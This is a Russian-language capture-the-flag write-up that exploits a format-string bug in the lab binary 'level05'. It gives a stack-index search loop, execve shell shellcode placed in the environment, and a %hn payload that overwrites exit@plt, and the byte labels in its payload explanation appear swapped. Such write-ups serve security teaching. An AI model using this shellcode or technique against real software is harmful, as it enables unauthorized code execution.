Эта программа представляет собой просто вызов fgets на stdin, преобразует символы в буфере из верхнего регистра в нижний и печатает буфер с помощью printf. Поскольку буфер напрямую используется в printf, мы можем использовать эксплойт строки формата.

Ищем индекс буфера в стеке:

---------------------------------------------------------------------------------------------------------

level05@OverRide:~$ for((i=0; i<200; i++)); do echo "Index $i" && ./level05 <<< "aaaa%$i\$x"; done | grep -B1 61616161

---------------------------------------------------------------------------------------------------------

Что дает нам:

---------------------------------------------------------------------------------------------------------

Index 10
aaaa61616161

---------------------------------------------------------------------------------------------------------

Мы внедряем наш шеллкод в окружение:

---------------------------------------------------------------------------------------------------------

level05@OverRide:~$ export SHELLCODE=`python -c 'print("\x90" * 0xffff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`

---------------------------------------------------------------------------------------------------------

Мы можем использовать эту полезную нагрузку:

---------------------------------------------------------------------------------------------------------

level05@OverRide:~$ cat <(python -c 'print ("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%249x%10$hn" + "%65278x%11$hn")') - | ./level05

---------------------------------------------------------------------------------------------------------

Пояснение к полезной нагрузке:

"\xe0\x97\x04\x08" -> адрес старших байтов exit @ plt
"\xe2\x97\x04\x08" -> адрес младших байтов exit @ plt
"%249x%10$hn" -> запишите 0x0101 (0x101 = 0xf9 (249) + 0x8) для младшего адреса нашего шеллкода с индексом 10 ("\ xe0 \ x97 \ x04 \ x08")
"%65278x%11$hn" -> запишите 0xffff (0xffff = 0xfefe (65278) + 0x0101) для старшего адреса нашего шелл-кода с индексом 11 ("\ xe2 \ x97 \ x04 \ x08")
